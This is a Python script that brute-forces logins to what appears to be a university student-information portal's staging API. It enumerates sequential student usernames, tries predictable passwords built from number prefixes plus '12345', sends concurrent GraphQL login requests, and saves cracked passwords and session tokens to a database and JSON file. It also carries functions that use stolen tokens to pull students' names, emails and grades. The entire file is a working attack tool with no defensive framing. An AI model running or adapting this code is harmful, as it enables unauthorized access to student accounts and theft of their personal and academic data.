import asyncio
import aiosqlite
import aiohttp
import json
import socket
import time
import hashlib
import html
from pathlib import Path
from bs4 import BeautifulSoup
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TimeElapsedColumn, TimeRemainingColumn
import os

# Optional mmh3 for hashing
try:
    import mmh3
    def mmh3_hash(data, seed=0):
        return mmh3.hash(str(data), seed=seed)
except ImportError:
    def mmh3_hash(data, seed=0):
        return int(hashlib.md5(str(data).encode() + str(seed).encode()).hexdigest(), 16)

console = Console()

URL = "https://api.staging.sis.shamuniversity.com/portal"
GRAPHQL_ENDPOINT = "https://api.staging.sis.shamuniversity.com/graphql"

STATIC_SUFFIX_DEFAULT = "12345"
DEFAULT_START_ID = 2425001
DEFAULT_COUNT = 150
DEFAULT_PREFIX_START = 1
DEFAULT_PREFIX_ATTEMPTS = 50
DEFAULT_USERNAME_PREFIX = "ENG"

COMMON_PREFIXES = [1, 2, 3, 5, 10, 11, 12, 20, 21, 22, 100, 101, 123, 2020, 2021, 2022, 2023, 2024]

DB_PATH = Path(__file__).parent / "labyrinth.db"
DB_PATH.parent.mkdir(parents=True, exist_ok=True)


class BloomFilter:
    def __init__(self, capacity=10000, error_rate=0.01):
        import math
        self.size = int(-capacity * math.log(error_rate) / (math.log(2) ** 2))
        self.hash_count = int(self.size * math.log(2) / capacity)
        self.bit_array = bytearray((self.size + 7) // 8)

    def _get_hash_indexes(self, item):
        return [
            abs(mmh3_hash(f"{item}_{i}", seed=i)) % self.size
            for i in range(self.hash_count)
        ]

    def add(self, item):
        for index in self._get_hash_indexes(item):
            self.bit_array[index // 8] |= (1 << (index % 8))

    def __contains__(self, item):
        return all(
            self.bit_array[index // 8] & (1 << (index % 8))
            for index in self._get_hash_indexes(item)
        )

    def add_credential(self, username, password):
        self.add(f"{username}:{password}")


tested_combinations = BloomFilter(capacity=50000)


class Stats:
    def __init__(self):
        self.attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        self.network_errors = 0
        self.start_time = time.time()

    def elapsed(self):
        return time.time() - self.start_time


stats = Stats()


async def wait_for_connection(host="api.staging.sis.shamuniversity.com", port=443):
    backoff = 5
    while True:
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, lambda: socket.create_connection((host, port), timeout=5))
            return
        except OSError:
            stats.network_errors += 1
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


def generate_username(user_id, prefix):
    return f"{prefix}{user_id:07d}"


def generate_password(prefix):
    return f"{prefix}{STATIC_SUFFIX_DEFAULT}"


def parse_grades_from_body(body_html):
    soup = BeautifulSoup(body_html, "html.parser")
    table = soup.find("table")
    if not table:
        return []

    headers = [th.get_text(strip=True) for th in table.find_all("th")]
    grades = []

    for row in table.find_all("tr")[1:]:
        cells = row.find_all("td")
        if len(cells) != len(headers):
            continue
        grades.append({
            headers[i]: cells[i].get_text(strip=True)
            for i in range(len(headers))
        })

    return grades


async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS credentials (
                username TEXT PRIMARY KEY,
                password TEXT,
                token TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS user_info (
                username TEXT PRIMARY KEY,
                email TEXT,
                firstname TEXT,
                lastname TEXT,
                fullname TEXT,
                grades TEXT
            )
        """)
        await db.commit()


async def save_credential(db, username, password, token):
    await db.execute(
        "INSERT OR REPLACE INTO credentials VALUES (?, ?, ?)",
        (username, password, token)
    )
    await db.commit()


async def save_user_info(db, user):
    await db.execute(
        "INSERT OR REPLACE INTO user_info VALUES (?, ?, ?, ?, ?, ?)",
        (
            user.get("username"),
            user.get("email"),
            user.get("firstname"),
            user.get("lastname"),
            user.get("fullname"),
            json.dumps(user.get("grades", []), ensure_ascii=False)
        )
    )
    await db.commit()


async def attempt_login(session, username, password):
    payload = {
        "operationName": "signinUser",
        "variables": {"username": username, "password": password},
        "query": """
            mutation signinUser($username: String!, $password: String!) {
                login(username: $username, password: $password)
            }
        """
    }

    try:
        async with session.post(URL, json=payload, timeout=10) as resp:
            stats.attempts += 1
            if resp.status != 200:
                stats.failed_logins += 1
                return False, None

            data = await resp.json()
            token = data.get("data", {}).get("login")

            if token:
                stats.successful_logins += 1
                return True, token

            stats.failed_logins += 1
            return False, None

    except Exception:
        stats.network_errors += 1
        stats.failed_logins += 1
        return False, None


async def attempt_single_login(session, username, password):
    key = f"{username}:{password}"

    if key in tested_combinations:
        return False, None, True

    tested_combinations.add_credential(username, password)
    success, token = await attempt_login(session, username, password)
    return success, token, False


async def login_and_save(db, session, username, prefix_start, prefix_end, progress, task):
    prefixes = COMMON_PREFIXES + list(range(prefix_start, prefix_end + 1))

    for prefix in prefixes:
        password = generate_password(prefix)
        success, token, skipped = await attempt_single_login(session, username, password)

        progress.update(task, advance=1)

        if skipped:
            continue

        if success:
            await save_credential(db, username, password, token)
            console.print(f"[green]SUCCESS {username}[/]")
            return True

    console.print(f"[red]FAILED {username}[/]")
    return False


async def fetch_user_info_and_grades(session, token):
    headers = {"Authorization": f"Bearer {token}"}

    async with session.post(GRAPHQL_ENDPOINT, json={"query": "{ getGUI { user { firstname lastname fullname email username } } }"}, headers=headers) as resp:
        if resp.status != 200:
            return None

        data = await resp.json()
        user = data.get("data", {}).get("getGUI", {}).get("user")

    return user


async def save_results():
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute("SELECT * FROM credentials")
        credentials = await cursor.fetchall()

    output = [
        {"username": u, "password": p, "token": t}
        for u, p, t in credentials
    ]

    path = DB_PATH.parent / "results.json"
    with open(path, "w") as f:
        json.dump(output, f, indent=2)

    console.print(f"[green]Saved: {path}[/]")


async def main():
    await init_db()

    usernames = [
        generate_username(i, DEFAULT_USERNAME_PREFIX)
        for i in range(DEFAULT_START_ID, DEFAULT_START_ID + DEFAULT_COUNT)
    ]

    async with aiohttp.ClientSession() as session, aiosqlite.connect(DB_PATH) as db:
        with Progress(
            SpinnerColumn(),
            "[progress.description]{task.description}",
            BarColumn(),
            TimeElapsedColumn(),
        ) as progress:

            task = progress.add_task("Processing...", total=len(usernames) * DEFAULT_PREFIX_ATTEMPTS)

            await asyncio.gather(*[
                login_and_save(db, session, u, DEFAULT_PREFIX_START, DEFAULT_PREFIX_START + DEFAULT_PREFIX_ATTEMPTS, progress, task)
                for u in usernames
            ])

    await save_results()


if __name__ == "__main__":
    asyncio.run(main())
